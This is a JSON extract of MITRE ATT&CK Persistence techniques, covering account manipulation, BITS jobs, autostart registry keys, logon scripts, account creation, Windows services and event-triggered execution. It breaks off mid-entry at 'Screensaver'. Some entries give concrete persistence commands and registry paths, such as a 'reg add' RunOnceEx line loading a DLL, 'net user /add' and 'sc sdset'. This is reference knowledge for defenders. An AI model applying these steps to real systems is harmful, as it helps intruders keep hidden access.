    "description": "An adversary may add additional local or domain groups to an adversary-controlled account to maintain persistent access to a system or domain.On Windows, accounts may use thenet localgroupandnet groupcommands to add existing users to local and domain groups.[1][2]On Linux, adversaries may use theusermodcommand for the same purpose.[3]For example, accounts may be added to the local administrators group on Windows devices to maintain elevated privileges. They may also be added to the Remote Desktop Users group, which allows them to leverageRemote Desktop Protocolto log into the endpoints in the future.[4]On Linux, accounts may be added to the sudoers group, allowing them to persistently leverageSudo and Sudo Cachingfor elevated privileges.In Windows environments, machine accounts may also be added to domain groups. This allows the local SYSTEM account to gain privileges on the domain.[5]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Account Manipulation",
    "parent_technique_id": "T1098",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:56:33.997887"
  },
  {
    "technique_id": "T1197",
    "name": "BITS Jobs",
    "description": "Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed throughComponent Object Model(COM).[1][2]BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.The interface to create and manage BITS jobs is accessible throughPowerShelland theBITSAdmintool.[2][3]Adversaries may abuse BITS to download (e.g.Ingress Tool Transfer), execute, and even clean up after running malicious code (e.g.Indicator Removal). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.[4][5][6]BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).[7][4]BITS upload functionalities can also be used to performExfiltration Over Alternative Protocol.[4]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:56:37.328229",
    "subtechniques": []
  },
  {
    "technique_id": "T1547",
    "name": "Boot or Logon Autostart Execution",
    "description": "Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.[1][2][3][4][5]These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.Since some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:56:40.680118",
    "subtechniques": [
      {
        "id": "T1547.001",
        "name": "Registry Run Keys / Startup Folder"
      },
      {
        "id": "T1547.002",
        "name": "Authentication Package"
      },
      {
        "id": "T1547.003",
        "name": "Time Providers"
      },
      {
        "id": "T1547.004",
        "name": "Winlogon Helper DLL"
      },
      {
        "id": "T1547.005",
        "name": "Security Support Provider"
      },
      {
        "id": "T1547.008",
        "name": "LSASS Driver"
      },
      {
        "id": "T1547.009",
        "name": "Shortcut Modification"
      },
      {
        "id": "T1547.010",
        "name": "Port Monitors"
      },
      {
        "id": "T1547.012",
        "name": "Print Processors"
      },
      {
        "id": "T1547.014",
        "name": "Active Setup"
      }
    ]
  },
  {
    "technique_id": "T1547.001",
    "name": "Registry Run Keys / Startup Folder",
    "description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.[1]These programs will be executed under the context of the user and will have the account's associated permissions level.The following run keys are created by default on Windows systems:HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceRun keys may exist under multiple hives.[2][3]TheHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceExis also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.[1]For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx:reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"[4]Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user isC:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. The startup folder path for all users isC:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp.The following Registry keys can be used to set startup folder items for persistence:HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell FoldersHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell FoldersHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell FoldersHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell FoldersThe following Registry keys can control automatic startup of services during boot:HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnceHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnceHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\RunHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\RunPrograms listed in the load value of the registry keyHKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windowsrun automatically for the currently logged-on user.By default, the multistringBootExecutevalue of the registry keyHKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manageris set toautocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also useMasqueradingto make the Registry entries look as if they are associated with legitimate programs.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Boot or Logon Autostart Execution",
    "parent_technique_id": "T1547",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:56:44.073056"
  },
  {
    "technique_id": "T1547.002",
    "name": "Authentication Package",
    "description": "Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.[1]Adversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry locationHKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\with the key value of\"Authentication Packages\"=<target binary>. The binary will then be executed by the system when the authentication packages are loaded.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Boot or Logon Autostart Execution",
    "parent_technique_id": "T1547",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:56:47.426965"
  },
  {
    "technique_id": "T1547.003",
    "name": "Time Providers",
    "description": "Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.[1]W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.[2]Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys ofHKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\.[2]The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.[2]Adversaries may abuse this architecture to establish persistence, specifically by creating a new arbitrarily named subkey  pointing to a malicious DLL in theDllNamevalue. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.[3]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Boot or Logon Autostart Execution",
    "parent_technique_id": "T1547",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:56:50.793113"
  },
  {
    "technique_id": "T1547.004",
    "name": "Winlogon Helper DLL",
    "description": "Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries inHKLM\\Software[\\Wow6432Node\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\andHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\are used to manage additional helper programs and functionalities that support Winlogon.[1]Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse:[1]Winlogon\\Notify - points to notification package DLLs that handle Winlogon eventsWinlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs onWinlogon\\Shell - points to explorer.exe, the system shell executed when a user logs onAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Boot or Logon Autostart Execution",
    "parent_technique_id": "T1547",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:56:54.039521"
  },
  {
    "technique_id": "T1547.005",
    "name": "Security Support Provider",
    "description": "Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.The SSP configuration is stored in two Registry keys:HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security PackagesandHKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.[1]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Boot or Logon Autostart Execution",
    "parent_technique_id": "T1547",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:56:57.379685"
  },
  {
    "technique_id": "T1547.008",
    "name": "LSASS Driver",
    "description": "Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.[1]Adversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g.,Hijack Execution Flow), an adversary can use LSA operations to continuously execute malicious payloads.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Boot or Logon Autostart Execution",
    "parent_technique_id": "T1547",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:57:00.705217"
  },
  {
    "technique_id": "T1547.009",
    "name": "Shortcut Modification",
    "description": "Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.Adversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence.[1]Although often used as payloads in an infection chain (e.g.Spearphishing Attachment), adversaries may also create a new shortcut as a means of indirection, while also abusingMasqueradingto make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.Shortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g.Browser Extensions) to persistently launch malware.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Boot or Logon Autostart Execution",
    "parent_technique_id": "T1547",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:57:04.085051"
  },
  {
    "technique_id": "T1547.010",
    "name": "Port Monitors",
    "description": "Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through theAddMonitorAPI call to set a DLL to be loaded at startup.[1]This DLL can be located inC:\\Windows\\System32and will be loaded and run by the print spooler service,spoolsv.exe, under SYSTEM level permissions on boot.[2]Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to theDrivervalue of an existing or new arbitrarily named subkey ofHKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors. The Registry key contains entries for the following:Local PortStandard TCP/IP PortUSB MonitorWSD Port",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Boot or Logon Autostart Execution",
    "parent_technique_id": "T1547",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:57:07.434055"
  },
  {
    "technique_id": "T1547.012",
    "name": "Print Processors",
    "description": "Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service,spoolsv.exe, during boot.[1]Adversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through theAddPrintProcessorAPI call with an account that hasSeLoadDriverPrivilegeenabled. Alternatively, a print processor can be registered to the print spooler service by adding theHKLM\\SYSTEM\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\[Windows architecture: e.g., Windows x64]\\Print Processors\\[user defined]\\DriverRegistry key that points to the DLL.For the malicious print processor to be correctly installed, the payload must be located in the dedicated system print-processor directory, that can be found with theGetPrintProcessorDirectoryAPI call, or referenced via a relative path from this directory.[2]After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.[3]The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Boot or Logon Autostart Execution",
    "parent_technique_id": "T1547",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:57:10.776058"
  },
  {
    "technique_id": "T1547.014",
    "name": "Active Setup",
    "description": "Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer.[1]These programs will be executed under the context of the user and will have the account's associated permissions level.Adversaries may abuse Active Setup by creating a key underHKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\and setting a malicious value forStubPath. This value will serve as the program that will be executed when a user logs into the computer.[2][3][4][5][6]Adversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also useMasqueradingto make the Registry entries look as if they are associated with legitimate programs.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Boot or Logon Autostart Execution",
    "parent_technique_id": "T1547",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:57:14.041749"
  },
  {
    "technique_id": "T1037",
    "name": "Boot or Logon Initialization Scripts",
    "description": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.[1][2]Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.An adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:57:17.371093",
    "subtechniques": [
      {
        "id": "T1037.001",
        "name": "Logon Script (Windows)"
      },
      {
        "id": "T1037.003",
        "name": "Network Logon Script"
      }
    ]
  },
  {
    "technique_id": "T1037.001",
    "name": "Logon Script (Windows)",
    "description": "Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system.[1]This is done via adding a path to a script to theHKCU\\Environment\\UserInitMprLogonScriptRegistry key.[2]Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Boot or Logon Initialization Scripts",
    "parent_technique_id": "T1037",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:57:20.698280"
  },
  {
    "technique_id": "T1037.003",
    "name": "Network Logon Script",
    "description": "Adversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects.[1]These logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems.Adversaries may use these scripts to maintain persistence on a network. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Boot or Logon Initialization Scripts",
    "parent_technique_id": "T1037",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:57:24.037697"
  },
  {
    "technique_id": "T1554",
    "name": "Compromise Host Software Binary",
    "description": "Adversaries may modify host software binaries to establish persistent access to systems. Software binaries/executables provide a wide range of system commands or services, programs, and libraries. Common software binaries are SSH clients, FTP clients, email clients, web browsers, and many other user or server applications.Adversaries may establish persistence though modifications to host software binaries. For example, an adversary may replace or otherwise infect a legitimate application binary (or support files) with a backdoor. Since these binaries may be routinely executed by applications or the user, the adversary can leverage this for persistent access to the host. An adversary may also modify a software binary such as an SSH client in order to persistently collect credentials during logins (i.e.,Modify Authentication Process).[1]An adversary may also modify an existing binary by patching in malicious functionality (e.g., IAT Hooking/Entry point patching)[2]prior to the binaryâ€™s legitimate execution. For example, an adversary may modify the entry point of a binary to point to malicious code patched in by the adversary before resuming normal execution flow.[3]After modifying a binary, an adversary may attempt toImpair Defensesby preventing it from updating (e.g., via theyum-versionlockcommand orversionlock.listfile in Linux systems that use the yum package manager).[1]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:57:27.386985",
    "subtechniques": []
  },
  {
    "technique_id": "T1136",
    "name": "Create Account",
    "description": "Adversaries may create an account to maintain access to victim systems.[1]With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.Accounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:57:30.669954",
    "subtechniques": [
      {
        "id": "T1136.001",
        "name": "Local Account"
      },
      {
        "id": "T1136.002",
        "name": "Domain Account"
      }
    ]
  },
  {
    "technique_id": "T1136.001",
    "name": "Local Account",
    "description": "Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.For example, with a sufficient level of access, the Windowsnet user /addcommand can be used to create a local account.  In Linux, theuseraddcommand can be used, while on macOS systems, thedscl -createcommand can be used. Local accounts may also be added to network devices, often via commonNetwork Device CLIcommands such asusername, to ESXi servers viaesxcli system account add, or to Kubernetes clusters using thekubectlutility.[1][2]Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Create Account",
    "parent_technique_id": "T1136",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:57:33.947603"
  },
  {
    "technique_id": "T1136.002",
    "name": "Domain Account",
    "description": "Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, thenet user /add /domaincommand can be used to create a domain account.[1]Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Create Account",
    "parent_technique_id": "T1136",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:57:37.310545"
  },
  {
    "technique_id": "T1543",
    "name": "Create or Modify System Process",
    "description": "Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services.[1]On macOS, launchd processes known asLaunch DaemonandLaunch Agentare run to finish system initialization and load user specific parameters.[2]Adversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.Services, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.[3]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:57:40.664887",
    "subtechniques": [
      {
        "id": "T1543.003",
        "name": "Windows Service"
      }
    ]
  },
  {
    "technique_id": "T1543.003",
    "name": "Windows Service",
    "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.[1]Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.Adversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API.Adversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex:.sys) to disk, the payload can be loaded and registered viaNative APIfunctions such asCreateServiceW()(or manually via functions such asZwLoadDriver()andZwSetValueKey()), by creating the required service Registry values (i.e.Modify Registry), or by using command-line utilities such asPnPUtil.exe.[2][3][4]Adversaries may leverage these drivers asRootkits to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part ofExploitation for Privilege Escalation.[5][4]Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services throughService Execution.To make detection analysis more challenging, malicious services may also incorporateMasquerade Task or Service(ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create â€˜hiddenâ€™ services (i.e.,Hide Artifacts), for example by using thesc sdsetcommand to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such asGet-Service,sc query, andservices.exe.[6][7]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Create or Modify System Process",
    "parent_technique_id": "T1543",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:57:44.143158"
  },
  {
    "technique_id": "T1546",
    "name": "Event Triggered Execution",
    "description": "Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.[1][2][3]Adversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.[4][5][6]Since the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:57:47.496522",
    "subtechniques": [
      {
        "id": "T1546.001",
        "name": "Change Default File Association"
      },
      {
        "id": "T1546.002",
        "name": "Screensaver"
      },
      {
        "id": "T1546.003",
        "name": "Windows Management Instrumentation Event Subscription"
      },
      {
        "id": "T1546.007",
        "name": "Netsh Helper DLL"
      },
      {
        "id": "T1546.008",
        "name": "Accessibility Features"
      },
      {
        "id": "T1546.009",
        "name": "AppCert DLLs"
      },
      {
        "id": "T1546.010",
        "name": "AppInit DLLs"
      },
      {
        "id": "T1546.011",
        "name": "Application Shimming"
      },
      {
        "id": "T1546.012",
        "name": "Image File Execution Options Injection"
      },
      {
        "id": "T1546.013",
        "name": "PowerShell Profile"
      },
      {
        "id": "T1546.015",
        "name": "Component Object Model Hijacking"
      },
      {
        "id": "T1546.016",
        "name": "Installer Packages"
      }
    ]
  },
  {
    "technique_id": "T1546.001",
    "name": "Change Default File Association",
    "description": "Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility.[1][2][3]Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.System file associations are listed underHKEY_CLASSES_ROOT.[extension], for exampleHKEY_CLASSES_ROOT.txt. The entries point to a handler for that extension located atHKEY_CLASSES_ROOT\\[handler]. The various commands are then listed as subkeys underneath the shell key atHKEY_CLASSES_ROOT\\[handler]\\shell\\[action]\\command. For example:HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\commandHKEY_CLASSES_ROOT\\txtfile\\shell\\print\\commandHKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\commandThe values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands.[4]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Event Triggered Execution",
    "parent_technique_id": "T1546",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:57:50.846104"
  },
  {
    "technique_id": "T1546.002",
    "name": "Screensaver",
